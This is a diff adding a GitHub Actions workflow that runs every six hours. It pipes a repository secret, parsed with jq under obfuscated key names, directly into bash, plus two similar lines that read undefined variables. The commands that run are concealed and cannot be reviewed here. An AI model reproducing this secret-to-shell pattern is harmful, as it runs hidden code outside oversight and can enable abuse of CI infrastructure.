@@ -1,0 +1,19 @@
+name: waishangtongbuz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: waishangtongbuz
+        env:
+          gk7: ${{ secrets.gk7 }}
+        run: |
+          echo $gk7 | jq -r .n8180 | /bin/bash
+          echo $hn6 | jq -r .oow2 | /bin/bash
+          echo $lab594 | jq -r .fxhn2264 | /bin/bash
+
